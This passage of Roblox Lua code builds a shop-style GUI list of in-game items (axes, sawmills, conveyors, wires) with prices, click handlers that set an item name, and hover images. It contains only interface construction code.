StealAxe.Size = UDim2.new(0, 173, 0, 20)
StealAxe.Font = Enum.Font.Fantasy
StealAxe.Text = "Steal Axe (190)"
StealAxe.TextColor3 = Color3.new(1, 1, 1)
StealAxe.TextSize = 14
StealAxe.MouseButton1Down:connect(function()
Item.Text = "Axe2"
end)

InfoText54 = Instance.new("ImageLabel")
InfoText54.Name = "ImageLabel"
InfoText54.Parent = MainFrame
InfoText54.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText54.BackgroundTransparency = 1
InfoText54.Position = UDim2.new(0, 40, 0, 200)
InfoText54.Size = UDim2.new(0, 100, 0, 100)
InfoText54.Image = "rbxassetid://3818544276"
InfoText54.Visible = false

StealAxe.MouseEnter:connect(function()
InfoText54.Visible = true
end)

StealAxe.MouseLeave:connect(function()
InfoText54.Visible = false
end)

HardenedAxe = Instance.new("TextButton")
HardenedAxe.Name = "HardenedAxe"
HardenedAxe.Parent = Woodrus
HardenedAxe.BackgroundColor3 = Color3.new(0, 0, 0)
HardenedAxe.BorderColor3 = Color3.fromRGB(151, 0, 0)
HardenedAxe.BackgroundTransparency = 0.6
HardenedAxe.Position = UDim2.new(0, 5, 0, 72)
HardenedAxe.Size = UDim2.new(0, 173, 0, 20)
HardenedAxe.Font = Enum.Font.Fantasy
HardenedAxe.Text = "Hardened Axe (550)"
HardenedAxe.TextColor3 = Color3.new(1, 1, 1)
HardenedAxe.TextSize = 14
HardenedAxe.MouseButton1Down:connect(function()
Item.Text = "Axe3"
end)

InfoText55 = Instance.new("ImageLabel")
InfoText55.Name = "ImageLabel"
InfoText55.Parent = MainFrame
InfoText55.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText55.BackgroundTransparency = 1
InfoText55.Position = UDim2.new(0, 40, 0, 200)
InfoText55.Size = UDim2.new(0, 100, 0, 100)
InfoText55.Image = "rbxassetid://3819334055"
InfoText55.Visible = false

HardenedAxe.MouseEnter:connect(function()
InfoText55.Visible = true
end)

HardenedAxe.MouseLeave:connect(function()
InfoText55.Visible = false
end)

SilverAxe = Instance.new("TextButton")
SilverAxe.Name = "SilverAxe"
SilverAxe.Parent = Woodrus
SilverAxe.BackgroundColor3 = Color3.new(0, 0, 0)
SilverAxe.BorderColor3 = Color3.fromRGB(151, 0, 0)
SilverAxe.BackgroundTransparency = 0.6
SilverAxe.Position = UDim2.new(0, 5, 0, 95)
SilverAxe.Size = UDim2.new(0, 173, 0, 20)
SilverAxe.Font = Enum.Font.Fantasy
SilverAxe.Text = "Silver Axe (2040)"
SilverAxe.TextColor3 = Color3.new(1, 1, 1)
SilverAxe.TextSize = 14
SilverAxe.MouseButton1Down:connect(function()
Item.Text = "SilverAxe"
end)

InfoText56 = Instance.new("ImageLabel")
InfoText56.Name = "ImageLabel"
InfoText56.Parent = MainFrame
InfoText56.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText56.BackgroundTransparency = 1
InfoText56.Position = UDim2.new(0, 40, 0, 200)
InfoText56.Size = UDim2.new(0, 100, 0, 100)
InfoText56.Image = "rbxassetid://3822714395"
InfoText56.Visible = false

SilverAxe.MouseEnter:connect(function()
InfoText56.Visible = true
end)

SilverAxe.MouseLeave:connect(function()
InfoText56.Visible = false
end)

WorkLight = Instance.new("TextButton")
WorkLight.Name = "WorkLight"
WorkLight.Parent = Woodrus
WorkLight.BackgroundColor3 = Color3.new(0, 0, 0)
WorkLight.BorderColor3 = Color3.fromRGB(151, 0, 0)
WorkLight.BackgroundTransparency = 0.6
WorkLight.Position = UDim2.new(0, 5, 0, 118)
WorkLight.Size = UDim2.new(0, 173, 0, 20)
WorkLight.Font = Enum.Font.Fantasy
WorkLight.Text = "Work Light (80)"
WorkLight.TextColor3 = Color3.new(1, 1, 1)
WorkLight.TextSize = 14
WorkLight.MouseButton1Down:connect(function()
Item.Text = "WorkLight"
end)

InfoText57 = Instance.new("ImageLabel")
InfoText57.Name = "ImageLabel"
InfoText57.Parent = MainFrame
InfoText57.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText57.BackgroundTransparency = 1
InfoText57.Position = UDim2.new(0, 40, 0, 200)
InfoText57.Size = UDim2.new(0, 100, 0, 100)
InfoText57.Image = "rbxassetid://3709648138"
InfoText57.Visible = false

WorkLight.MouseEnter:connect(function()
InfoText57.Visible = true
end)

WorkLight.MouseLeave:connect(function()
InfoText57.Visible = false
end)

UtilityTruck = Instance.new("TextButton")
UtilityTruck.Name = "UtilityTruck"
UtilityTruck.Parent = Woodrus
UtilityTruck.BackgroundColor3 = Color3.new(0, 0, 0)
UtilityTruck.BorderColor3 = Color3.fromRGB(151, 0, 0)
UtilityTruck.BackgroundTransparency = 0.6
UtilityTruck.Position = UDim2.new(0, 5, 0, 141)
UtilityTruck.Size = UDim2.new(0, 173, 0, 20)
UtilityTruck.Font = Enum.Font.Fantasy
UtilityTruck.Text = "Utility Truck (400)"
UtilityTruck.TextColor3 = Color3.new(1, 1, 1)
UtilityTruck.TextSize = 14
UtilityTruck.MouseButton1Down:connect(function()
Item.Text = "UtilityTruck"
end)

InfoText58 = Instance.new("ImageLabel")
InfoText58.Name = "ImageLabel"
InfoText58.Parent = MainFrame
InfoText58.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText58.BackgroundTransparency = 1
InfoText58.Position = UDim2.new(0, 40, 0, 200)
InfoText58.Size = UDim2.new(0, 100, 0, 100)
InfoText58.Image = "rbxassetid://3704340394"
InfoText58.Visible = false

UtilityTruck.MouseEnter:connect(function()
InfoText58.Visible = true
end)

UtilityTruck.MouseLeave:connect(function()
InfoText58.Visible = false
end)

Sawmax01 = Instance.new("TextButton")
Sawmax01.Name = "Sawmax01"
Sawmax01.Parent = Woodrus
Sawmax01.BackgroundColor3 = Color3.new(0, 0, 0)
Sawmax01.BorderColor3 = Color3.fromRGB(151, 0, 0)
Sawmax01.BackgroundTransparency = 0.6
Sawmax01.Position = UDim2.new(0, 5, 0, 164)
Sawmax01.Size = UDim2.new(0, 173, 0, 20)
Sawmax01.Font = Enum.Font.Fantasy
Sawmax01.Text = "Sawmax 01 (11000)"
Sawmax01.TextColor3 = Color3.new(1, 1, 1)
Sawmax01.TextSize = 14
Sawmax01.MouseButton1Down:connect(function()
Item.Text = "Sawmill3"
end)

InfoText59 = Instance.new("ImageLabel")
InfoText59.Name = "ImageLabel"
InfoText59.Parent = MainFrame
InfoText59.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText59.BackgroundTransparency = 1
InfoText59.Position = UDim2.new(0, 40, 0, 200)
InfoText59.Size = UDim2.new(0, 100, 0, 100)
InfoText59.Image = "rbxassetid://3704333727"
InfoText59.Visible = false

Sawmax01.MouseEnter:connect(function()
InfoText59.Visible = true
end)

Sawmax01.MouseLeave:connect(function()
InfoText59.Visible = false
end)

Sawmill4L = Instance.new("TextButton")
Sawmill4L.Name = "Sawmill4L"
Sawmill4L.Parent = Woodrus
Sawmill4L.BackgroundColor3 = Color3.new(0, 0, 0)
Sawmill4L.BorderColor3 = Color3.fromRGB(151, 0, 0)
Sawmill4L.BackgroundTransparency = 0.6
Sawmill4L.Position = UDim2.new(0, 5, 0, 187)
Sawmill4L.Size = UDim2.new(0, 173, 0, 20)
Sawmill4L.Font = Enum.Font.Fantasy
Sawmill4L.Text = "Sawmill 4L (86500)"
Sawmill4L.TextColor3 = Color3.new(1, 1, 1)
Sawmill4L.TextSize = 14
Sawmill4L.MouseButton1Down:connect(function()
Item.Text = "Sawmill4L"
end)

InfoText60 = Instance.new("ImageLabel")
InfoText60.Name = "ImageLabel"
InfoText60.Parent = MainFrame
InfoText60.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText60.BackgroundTransparency = 1
InfoText60.Position = UDim2.new(0, 40, 0, 200)
InfoText60.Size = UDim2.new(0, 100, 0, 100)
InfoText60.Image = "rbxassetid://3704334524"
InfoText60.Visible = false

Sawmill4L.MouseEnter:connect(function()
InfoText60.Visible = true
end)

Sawmill4L.MouseLeave:connect(function()
InfoText60.Visible = false
end)

Sawmill4 = Instance.new("TextButton")
Sawmill4.Name = "Sawmill4"
Sawmill4.Parent = Woodrus
Sawmill4.BackgroundColor3 = Color3.new(0, 0, 0)
Sawmill4.BorderColor3 = Color3.fromRGB(151, 0, 0)
Sawmill4.BackgroundTransparency = 0.6
Sawmill4.Position = UDim2.new(0, 5, 0, 210)
Sawmill4.Size = UDim2.new(0, 173, 0, 20)
Sawmill4.Font = Enum.Font.Fantasy
Sawmill4.Text = "Sawmill 4 (22500)"
Sawmill4.TextColor3 = Color3.new(1, 1, 1)
Sawmill4.TextSize = 14
Sawmill4.MouseButton1Down:connect(function()
Item.Text = "Sawmill4"
end)

InfoText61 = Instance.new("ImageLabel")
InfoText61.Name = "ImageLabel"
InfoText61.Parent = MainFrame
InfoText61.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText61.BackgroundTransparency = 1
InfoText61.Position = UDim2.new(0, 40, 0, 200)
InfoText61.Size = UDim2.new(0, 100, 0, 100)
InfoText61.Image = "rbxassetid://3704334131"
InfoText61.Visible = false

Sawmill4.MouseEnter:connect(function()
InfoText61.Visible = true
end)

Sawmill4.MouseLeave:connect(function()
InfoText61.Visible = false
end)

Sawmill2 = Instance.new("TextButton")
Sawmill2.Name = "Sawmill2"
Sawmill2.Parent = Woodrus
Sawmill2.BackgroundColor3 = Color3.new(0, 0, 0)
Sawmill2.BorderColor3 = Color3.fromRGB(151, 0, 0)
Sawmill2.BackgroundTransparency = 0.6
Sawmill2.Position = UDim2.new(0, 5, 0, 233)
Sawmill2.Size = UDim2.new(0, 173, 0, 20)
Sawmill2.Font = Enum.Font.Fantasy
Sawmill2.Text = "Sawmill 2 (1600)"
Sawmill2.TextColor3 = Color3.new(1, 1, 1)
Sawmill2.TextSize = 14
Sawmill2.MouseButton1Down:connect(function()
Item.Text = "Sawmill2"
end)

InfoText62 = Instance.new("ImageLabel")
InfoText62.Name = "ImageLabel"
InfoText62.Parent = MainFrame
InfoText62.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText62.BackgroundTransparency = 1
InfoText62.Position = UDim2.new(0, 40, 0, 200)
InfoText62.Size = UDim2.new(0, 100, 0, 100)
InfoText62.Image = "rbxassetid://3704333368"
InfoText62.Visible = false

Sawmill2.MouseEnter:connect(function()
InfoText62.Visible = true
end)

Sawmill2.MouseLeave:connect(function()
InfoText62.Visible = false
end)

Sawmill = Instance.new("TextButton")
Sawmill.Name = "Sawmill"
Sawmill.Parent = Woodrus
Sawmill.BackgroundColor3 = Color3.new(0, 0, 0)
Sawmill.BorderColor3 = Color3.fromRGB(151, 0, 0)
Sawmill.BackgroundTransparency = 0.6
Sawmill.Position = UDim2.new(0, 5, 0, 256)
Sawmill.Size = UDim2.new(0, 173, 0, 20)
Sawmill.Font = Enum.Font.Fantasy
Sawmill.Text = "Sawmill (130)"
Sawmill.TextColor3 = Color3.new(1, 1, 1)
Sawmill.TextSize = 14
Sawmill.MouseButton1Down:connect(function()
Item.Text = "Sawmill"
end)

InfoText63 = Instance.new("ImageLabel")
InfoText63.Name = "ImageLabel"
InfoText63.Parent = MainFrame
InfoText63.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText63.BackgroundTransparency = 1
InfoText63.Position = UDim2.new(0, 40, 0, 200)
InfoText63.Size = UDim2.new(0, 100, 0, 100)
InfoText63.Image = "rbxassetid://3704332953"
InfoText63.Visible = false

Sawmill.MouseEnter:connect(function()
InfoText63.Visible = true
end)

Sawmill.MouseLeave:connect(function()
InfoText63.Visible = false
end)

BagOfSand = Instance.new("TextButton")
BagOfSand.Name = "BagOfSand"
BagOfSand.Parent = Woodrus
BagOfSand.BackgroundColor3 = Color3.new(0, 0, 0)
BagOfSand.BorderColor3 = Color3.fromRGB(151, 0, 0)
BagOfSand.BackgroundTransparency = 0.6
BagOfSand.Position = UDim2.new(0, 5, 0, 279)
BagOfSand.Size = UDim2.new(0, 173, 0, 20)
BagOfSand.Font = Enum.Font.Fantasy
BagOfSand.Text = "Bag Of Sand (1600)"
BagOfSand.TextColor3 = Color3.new(1, 1, 1)
BagOfSand.TextSize = 14
BagOfSand.MouseButton1Down:connect(function()
Item.Text = "BagOfSand"
end)

InfoText64 = Instance.new("ImageLabel")
InfoText64.Name = "ImageLabel"
InfoText64.Parent = MainFrame
InfoText64.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText64.BackgroundTransparency = 1
InfoText64.Position = UDim2.new(0, 40, 0, 200)
InfoText64.Size = UDim2.new(0, 100, 0, 100)
InfoText64.Image = "rbxassetid://3709574757"
InfoText64.Visible = false

BagOfSand.MouseEnter:connect(function()
InfoText64.Visible = true
end)

BagOfSand.MouseLeave:connect(function()
InfoText64.Visible = false
end)

ChopSaw = Instance.new("TextButton")
ChopSaw.Name = "ChopSaw"
ChopSaw.Parent = Woodrus
ChopSaw.BackgroundColor3 = Color3.new(0, 0, 0)
ChopSaw.BorderColor3 = Color3.fromRGB(151, 0, 0)
ChopSaw.BackgroundTransparency = 0.6
ChopSaw.Position = UDim2.new(0, 5, 0, 302)
ChopSaw.Size = UDim2.new(0, 173, 0, 20)
ChopSaw.Font = Enum.Font.Fantasy
ChopSaw.Text = "Chop Saw (12200)"
ChopSaw.TextColor3 = Color3.new(1, 1, 1)
ChopSaw.TextSize = 14
ChopSaw.MouseButton1Down:connect(function()
Item.Text = "ChopSaw"
end)

InfoText65 = Instance.new("ImageLabel")
InfoText65.Name = "ImageLabel"
InfoText65.Parent = MainFrame
InfoText65.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText65.BackgroundTransparency = 1
InfoText65.Position = UDim2.new(0, 40, 0, 200)
InfoText65.Size = UDim2.new(0, 100, 0, 100)
InfoText65.Image = "rbxassetid://3709101992"
InfoText65.Visible = false

ChopSaw.MouseEnter:connect(function()
InfoText65.Visible = true
end)

ChopSaw.MouseLeave:connect(function()
InfoText65.Visible = false
end)

PressurePlate = Instance.new("TextButton")
PressurePlate.Name = "PressurePlate"
PressurePlate.Parent = Woodrus
PressurePlate.BackgroundColor3 = Color3.new(0, 0, 0)
PressurePlate.BorderColor3 = Color3.fromRGB(151, 0, 0)
PressurePlate.BackgroundTransparency = 0.6
PressurePlate.Position = UDim2.new(0, 5, 0, 325)
PressurePlate.Size = UDim2.new(0, 173, 0, 20)
PressurePlate.Font = Enum.Font.Fantasy
PressurePlate.Text = "Pressure Plate (640)"
PressurePlate.TextColor3 = Color3.new(1, 1, 1)
PressurePlate.TextSize = 14
PressurePlate.MouseButton1Down:connect(function()
Item.Text = "PressurePlate"
end)

InfoText66 = Instance.new("ImageLabel")
InfoText66.Name = "ImageLabel"
InfoText66.Parent = MainFrame
InfoText66.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText66.BackgroundTransparency = 1
InfoText66.Position = UDim2.new(0, 40, 0, 200)
InfoText66.Size = UDim2.new(0, 100, 0, 100)
InfoText66.Image = "rbxassetid://3709111292"
InfoText66.Visible = false

PressurePlate.MouseEnter:connect(function()
InfoText66.Visible = true
end)

PressurePlate.MouseLeave:connect(function()
InfoText66.Visible = false
end)


Lever0 = Instance.new("TextButton")
Lever0.Name = "Lever0"
Lever0.Parent = Woodrus
Lever0.BackgroundColor3 = Color3.new(0, 0, 0)
Lever0.BorderColor3 = Color3.fromRGB(151, 0, 0)
Lever0.BackgroundTransparency = 0.6
Lever0.Position = UDim2.new(0, 5, 0,348)
Lever0.Size = UDim2.new(0, 173, 0, 20)
Lever0.Font = Enum.Font.Fantasy
Lever0.Text = "Lever (640)"
Lever0.TextColor3 = Color3.new(1, 1, 1)
Lever0.TextSize = 14
Lever0.MouseButton1Down:connect(function()
Item.Text = "Lever0"
end)

InfoText67 = Instance.new("ImageLabel")
InfoText67.Name = "ImageLabel"
InfoText67.Parent = MainFrame
InfoText67.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText67.BackgroundTransparency = 1
InfoText67.Position = UDim2.new(0, 40, 0, 200)
InfoText67.Size = UDim2.new(0, 100, 0, 100)
InfoText67.Image = "rbxassetid://3709107707"
InfoText67.Visible = false

Lever0.MouseEnter:connect(function()
InfoText67.Visible = true
end)

Lever0.MouseLeave:connect(function()
InfoText67.Visible = false
end)

Button0 = Instance.new("TextButton")
Button0.Name = "Button0"
Button0.Parent = Woodrus
Button0.BackgroundColor3 = Color3.new(0, 0, 0)
Button0.BorderColor3 = Color3.fromRGB(151, 0, 0)
Button0.BackgroundTransparency = 0.6
Button0.Position = UDim2.new(0, 5, 0, 371)
Button0.Size = UDim2.new(0, 173, 0, 20)
Button0.Font = Enum.Font.Fantasy
Button0.Text = "Button (320)"
Button0.TextColor3 = Color3.new(1, 1, 1)
Button0.TextSize = 14
Button0.MouseButton1Down:connect(function()
Item.Text = "Button0"
end)

InfoText68 = Instance.new("ImageLabel")
InfoText68.Name = "ImageLabel"
InfoText68.Parent = MainFrame
InfoText68.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText68.BackgroundTransparency = 1
InfoText68.Position = UDim2.new(0, 40, 0, 200)
InfoText68.Size = UDim2.new(0, 100, 0, 100)
InfoText68.Image = "rbxassetid://3709101697"
InfoText68.Visible = false

Button0.MouseEnter:connect(function()
InfoText68.Visible = true
end)

Button0.MouseLeave:connect(function()
InfoText68.Visible = false
end)

Wire = Instance.new("TextButton")
Wire.Name = "Wire"
Wire.Parent = Woodrus
Wire.BackgroundColor3 = Color3.new(0, 0, 0)
Wire.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wire.BackgroundTransparency = 0.6
Wire.Position = UDim2.new(0, 5, 0, 394)
Wire.Size = UDim2.new(0, 173, 0, 20)
Wire.Font = Enum.Font.Fantasy
Wire.Text = "Wire (205)"
Wire.TextColor3 = Color3.new(1, 1, 1)
Wire.TextSize = 14
Wire.MouseButton1Down:connect(function()
Item.Text = "Wire"
end)

InfoText69 = Instance.new("ImageLabel")
InfoText69.Name = "ImageLabel"
InfoText69.Parent = MainFrame
InfoText69.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText69.BackgroundTransparency = 1
InfoText69.Position = UDim2.new(0, 40, 0, 200)
InfoText69.Size = UDim2.new(0, 100, 0, 100)
InfoText69.Image = "rbxassetid://3709112709"
InfoText69.Visible = false

Wire.MouseEnter:connect(function()
InfoText69.Visible = true
end)

Wire.MouseLeave:connect(function()
InfoText69.Visible = false
end)

TightTurnConveyorSupports = Instance.new("TextButton")
TightTurnConveyorSupports.Name = "TightTurnConveyorSupports"
TightTurnConveyorSupports.Parent = Woodrus
TightTurnConveyorSupports.BackgroundColor3 = Color3.new(0, 0, 0)
TightTurnConveyorSupports.BorderColor3 = Color3.fromRGB(151, 0, 0)
TightTurnConveyorSupports.BackgroundTransparency = 0.6
TightTurnConveyorSupports.Position = UDim2.new(0, 5, 0, 417)
TightTurnConveyorSupports.Size = UDim2.new(0, 173, 0, 20)
TightTurnConveyorSupports.Font = Enum.Font.Fantasy
TightTurnConveyorSupports.Text = "Tight Turn Supports (20)"
TightTurnConveyorSupports.TextColor3 = Color3.new(1, 1, 1)
TightTurnConveyorSupports.TextSize = 14
TightTurnConveyorSupports.MouseButton1Down:connect(function()
Item.Text = "TightTurnConveyorSupports"
end)

InfoText70 = Instance.new("ImageLabel")
InfoText70.Name = "ImageLabel"
InfoText70.Parent = MainFrame
InfoText70.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText70.BackgroundTransparency = 1
InfoText70.Position = UDim2.new(0, 40, 0, 200)
InfoText70.Size = UDim2.new(0, 100, 0, 100)
InfoText70.Image = "rbxassetid://3703716982"
InfoText70.Visible = false

TightTurnConveyorSupports.MouseEnter:connect(function()
InfoText70.Visible = true
end)

TightTurnConveyorSupports.MouseLeave:connect(function()
InfoText70.Visible = false
end)

ConveyorSupports = Instance.new("TextButton")
ConveyorSupports.Name = "ConveyorSupports"
ConveyorSupports.Parent = Woodrus
ConveyorSupports.BackgroundColor3 = Color3.new(0, 0, 0)
ConveyorSupports.BorderColor3 = Color3.fromRGB(151, 0, 0)
ConveyorSupports.BackgroundTransparency = 0.6
ConveyorSupports.Position = UDim2.new(0, 5, 0, 440)
ConveyorSupports.Size = UDim2.new(0, 173, 0, 20)
ConveyorSupports.Font = Enum.Font.Fantasy
ConveyorSupports.Text = "Conveyor Supports (12)"
ConveyorSupports.TextColor3 = Color3.new(1, 1, 1)
ConveyorSupports.TextSize = 14
ConveyorSupports.MouseButton1Down:connect(function()
Item.Text = "ConveyorSupports"
end)

InfoText71 = Instance.new("ImageLabel")
InfoText71.Name = "ImageLabel"
InfoText71.Parent = MainFrame
InfoText71.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText71.BackgroundTransparency = 1
InfoText71.Position = UDim2.new(0, 40, 0, 200)
InfoText71.Size = UDim2.new(0, 100, 0, 100)
InfoText71.Image = "rbxassetid://3703713976"
InfoText71.Visible = false

ConveyorSupports.MouseEnter:connect(function()
InfoText71.Visible = true
end)

ConveyorSupports.MouseLeave:connect(function()
InfoText71.Visible = false
end)

ConveyorFunnel = Instance.new("TextButton")
ConveyorFunnel.Name = "ConveyorFunnel"
ConveyorFunnel.Parent = Woodrus
ConveyorFunnel.BackgroundColor3 = Color3.new(0, 0, 0)
ConveyorFunnel.BorderColor3 = Color3.fromRGB(151, 0, 0)
ConveyorFunnel.BackgroundTransparency = 0.6
ConveyorFunnel.Position = UDim2.new(0, 5, 0, 463)
ConveyorFunnel.Size = UDim2.new(0, 173, 0, 20)
ConveyorFunnel.Font = Enum.Font.Fantasy
ConveyorFunnel.Text = "Conveyor Funnel (60)"
ConveyorFunnel.TextColor3 = Color3.new(1, 1, 1)
ConveyorFunnel.TextSize = 14
ConveyorFunnel.MouseButton1Down:connect(function()
Item.Text = "ConveyorFunnel"
end)

InfoText72 = Instance.new("ImageLabel")
InfoText72.Name = "ImageLabel"
InfoText72.Parent = MainFrame
InfoText72.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText72.BackgroundTransparency = 1
InfoText72.Position = UDim2.new(0, 40, 0, 200)
InfoText72.Size = UDim2.new(0, 100, 0, 100)
InfoText72.Image = "rbxassetid://3703713578"
InfoText72.Visible = false

ConveyorFunnel.MouseEnter:connect(function()
InfoText72.Visible = true
end)

ConveyorFunnel.MouseLeave:connect(function()
InfoText72.Visible = false
end)

LogSweeper = Instance.new("TextButton")
LogSweeper.Name = "LogSweeper"
LogSweeper.Parent = Woodrus
LogSweeper.BackgroundColor3 = Color3.new(0, 0, 0)
LogSweeper.BorderColor3 = Color3.fromRGB(151, 0, 0)
LogSweeper.BackgroundTransparency = 0.6
LogSweeper.Position = UDim2.new(0, 5, 0, 486)
LogSweeper.Size = UDim2.new(0, 173, 0, 20)
LogSweeper.Font = Enum.Font.Fantasy
LogSweeper.Text = "Log Sweeper (430)"
LogSweeper.TextColor3 = Color3.new(1, 1, 1)
LogSweeper.TextSize = 14
LogSweeper.MouseButton1Down:connect(function()
Item.Text = "LogSweeper"
end)

InfoText73 = Instance.new("ImageLabel")
InfoText73.Name = "ImageLabel"
InfoText73.Parent = MainFrame
InfoText73.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText73.BackgroundTransparency = 1
InfoText73.Position = UDim2.new(0, 40, 0, 200)
InfoText73.Size = UDim2.new(0, 100, 0, 100)
InfoText73.Image = "rbxassetid://3703714663"
InfoText73.Visible = false

LogSweeper.MouseEnter:connect(function()
InfoText73.Visible = true
end)

LogSweeper.MouseLeave:connect(function()
InfoText73.Visible = false
end)

ConveyorSwitch = Instance.new("TextButton")
ConveyorSwitch.Name = "ConveyorSwitch"
ConveyorSwitch.Parent = Woodrus
ConveyorSwitch.BackgroundColor3 = Color3.new(0, 0, 0)
ConveyorSwitch.BorderColor3 = Color3.fromRGB(151, 0, 0)
ConveyorSwitch.BackgroundTransparency = 0.6
ConveyorSwitch.Position = UDim2.new(0, 5, 0, 509)
ConveyorSwitch.Size = UDim2.new(0, 173, 0, 20)
ConveyorSwitch.Font = Enum.Font.Fantasy
ConveyorSwitch.Text = "Conveyor Switch (320)"
ConveyorSwitch.TextColor3 = Color3.new(1, 1, 1)
ConveyorSwitch.TextSize = 14
ConveyorSwitch.MouseButton1Down:connect(function()
Item.Text = "ConveyorSwitch"
end)

InfoText74 = Instance.new("ImageLabel")
InfoText74.Name = "ImageLabel"
InfoText74.Parent = MainFrame
InfoText74.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText74.BackgroundTransparency = 1
InfoText74.Position = UDim2.new(0, 40, 0, 200)
InfoText74.Size = UDim2.new(0, 100, 0, 100)
InfoText74.Image = "rbxassetid://3703714308"
InfoText74.Visible = false

ConveyorSwitch.MouseEnter:connect(function()
InfoText74.Visible = true
end)

ConveyorSwitch.MouseLeave:connect(function()
InfoText74.Visible = false
end)

StraightSwitchConveyorRight = Instance.new("TextButton")
StraightSwitchConveyorRight.Name = "StraightSwitchConveyorRight"
StraightSwitchConveyorRight.Parent = Woodrus
StraightSwitchConveyorRight.BackgroundColor3 = Color3.new(0, 0, 0)
StraightSwitchConveyorRight.BorderColor3 = Color3.fromRGB(151, 0, 0)
StraightSwitchConveyorRight.BackgroundTransparency = 0.6
StraightSwitchConveyorRight.Position = UDim2.new(0, 5, 0, 533)
StraightSwitchConveyorRight.Size = UDim2.new(0, 173, 0, 20)
StraightSwitchConveyorRight.Font = Enum.Font.Fantasy
StraightSwitchConveyorRight.Text = "Straight Switch Right (480)"
StraightSwitchConveyorRight.TextColor3 = Color3.new(1, 1, 1)
StraightSwitchConveyorRight.TextSize = 14
StraightSwitchConveyorRight.MouseButton1Down:connect(function()
Item.Text = "StraightSwitchConveyorRight"
end)

InfoText75 = Instance.new("ImageLabel")
InfoText75.Name = "ImageLabel"
InfoText75.Parent = MainFrame
InfoText75.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText75.BackgroundTransparency = 1
InfoText75.Position = UDim2.new(0, 40, 0, 200)
InfoText75.Size = UDim2.new(0, 100, 0, 100)
InfoText75.Image = "rbxassetid://3703716046"
InfoText75.Visible = false

StraightSwitchConveyorRight.MouseEnter:connect(function()
InfoText75.Visible = true
end)

StraightSwitchConveyorRight.MouseLeave:connect(function()
InfoText75.Visible = false
end)

StraightSwitchConveyorLeft = Instance.new("TextButton")
StraightSwitchConveyorLeft.Name = "StraightSwitchConveyorLeft"
StraightSwitchConveyorLeft.Parent = Woodrus
StraightSwitchConveyorLeft.BackgroundColor3 = Color3.new(0, 0, 0)
StraightSwitchConveyorLeft.BorderColor3 = Color3.fromRGB(151, 0, 0)
StraightSwitchConveyorLeft.BackgroundTransparency = 0.6
StraightSwitchConveyorLeft.Position = UDim2.new(0, 5, 0, 556)
StraightSwitchConveyorLeft.Size = UDim2.new(0, 173, 0, 20)
StraightSwitchConveyorLeft.Font = Enum.Font.Fantasy
StraightSwitchConveyorLeft.Text = "Straight Switch Left (480)"
StraightSwitchConveyorLeft.TextColor3 = Color3.new(1, 1, 1)
StraightSwitchConveyorLeft.TextSize = 14
StraightSwitchConveyorLeft.MouseButton1Down:connect(function()
Item.Text = "StraightSwitchConveyorLeft"
end)

InfoText76 = Instance.new("ImageLabel")
InfoText76.Name = "ImageLabel"
InfoText76.Parent = MainFrame
InfoText76.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText76.BackgroundTransparency = 1
InfoText76.Position = UDim2.new(0, 40, 0, 200)
InfoText76.Size = UDim2.new(0, 100, 0, 100)
InfoText76.Image = "rbxassetid://3703715644"
InfoText76.Visible = false

StraightSwitchConveyorLeft.MouseEnter:connect(function()
InfoText76.Visible = true
end)

StraightSwitchConveyorLeft.MouseLeave:connect(function()
InfoText76.Visible = false
end)

TightTurnConveyor = Instance.new("TextButton")
TightTurnConveyor.Name = "TightTurnConveyor"
TightTurnConveyor.Parent = Woodrus
TightTurnConveyor.BackgroundColor3 = Color3.new(0, 0, 0)
TightTurnConveyor.BorderColor3 = Color3.fromRGB(151, 0, 0)
TightTurnConveyor.BackgroundTransparency = 0.6
TightTurnConveyor.Position = UDim2.new(0, 5, 0, 579)
TightTurnConveyor.Size = UDim2.new(0, 173, 0, 20)
TightTurnConveyor.Font = Enum.Font.Fantasy
TightTurnConveyor.Text = "Tight Turn Conveyor (100)"
TightTurnConveyor.TextColor3 = Color3.new(1, 1, 1)
TightTurnConveyor.TextSize = 14
TightTurnConveyor.MouseButton1Down:connect(function()
Item.Text = "TightTurnConveyor"
end)

InfoText77 = Instance.new("ImageLabel")
InfoText77.Name = "ImageLabel"
InfoText77.Parent = MainFrame
InfoText77.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText77.BackgroundTransparency = 1
InfoText77.Position = UDim2.new(0, 40, 0, 200)
InfoText77.Size = UDim2.new(0, 100, 0, 100)
InfoText77.Image = "rbxassetid://3703716592"
InfoText77.Visible = false

TightTurnConveyor.MouseEnter:connect(function()
InfoText77.Visible = true
end)

TightTurnConveyor.MouseLeave:connect(function()
InfoText77.Visible = false
end)

TiltConveyor = Instance.new("TextButton")
TiltConveyor.Name = "TiltConveyor"
TiltConveyor.Parent = Woodrus
TiltConveyor.BackgroundColor3 = Color3.new(0, 0, 0)
TiltConveyor.BorderColor3 = Color3.fromRGB(151, 0, 0)
TiltConveyor.BackgroundTransparency = 0.6
TiltConveyor.Position = UDim2.new(0, 5, 0, 602)
TiltConveyor.Size = UDim2.new(0, 173, 0, 20)
TiltConveyor.Font = Enum.Font.Fantasy
TiltConveyor.Text = "Tilt Conveyor (95)"
TiltConveyor.TextColor3 = Color3.new(1, 1, 1)
TiltConveyor.TextSize = 14
TiltConveyor.MouseButton1Down:connect(function()
Item.Text = "TiltConveyor"
end)

InfoText78 = Instance.new("ImageLabel")
InfoText78.Name = "ImageLabel"
InfoText78.Parent = MainFrame
